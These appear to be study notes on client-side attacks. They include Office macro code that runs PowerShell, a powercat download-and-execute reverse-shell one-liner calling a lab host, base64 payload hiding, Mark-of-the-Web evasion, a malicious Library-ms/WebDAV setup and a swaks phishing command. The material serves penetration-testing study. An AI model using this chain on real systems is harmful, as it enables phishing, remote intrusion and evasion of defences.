---
layout: blank
---

### Information Gathering
- **Metadata**
	- Examining metadata of company-created PDFs can be a good source of information
- theHarvester - searches for emails given a domain -d
- **Client Fingerprinting**
	- Canarytokens - tool that can fingerprint a computer from a link
		- This token grabs browser info, IP address, and OS info

### Attacking MS Office
- **MS Office Attack**
	- Can't send malware directly by email, so we need to get them to download the spreadsheet with macros from a link
	- Also need to "blur" the spreadsheet so victim clicks "Enable Editing" to allow macros
	- Avoid Mark of the Web (MOTW) by putting malware inside 7zip, ISO, IMG
- **MS Office Macros**
	- To make macros: View -> Macros
	- Basic macro code that opens powershell:
```
Sub AutoOpen()

  MyMacro

End Sub
Sub Document_Open()

  MyMacro

End Sub
Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"

End Sub
```
- Powercat
	- Creates reverse shells, but detected by defender
	- Command to download/execute the reverse shell: `IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell`
		- This is just grabbing a hosted powershell script
		- Powercat: 
	- Can be passed to the macro by encoding it in chunks of 50 base64 characters:
		- `Dim Str as String`
		- `Str = Str + "powershell.exe -nop -w hidden -enc {base64}"`
		- `Str = Str + {base64}"`
		- `CreateObject("Wscript.Shell").Run Str`

### Abusing Windows Library Files
- Windows library files are less well-known and can be equally effective
- Executing .Library-ms file into executing .lnk file
- These files display remote directories like local directories, where we put .lnk file
	- `pip3 install wsgidav` for a WebDAV server to host/serve files
	- usage: `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root {directory}`  
- config.Library-ms file contents:
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
- Sending a phishing email with the share:
	- `sudo swaks -t {to_email} -t {to_email} --from {from_email} --attach @config.Library-ms --server {mail_server} --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`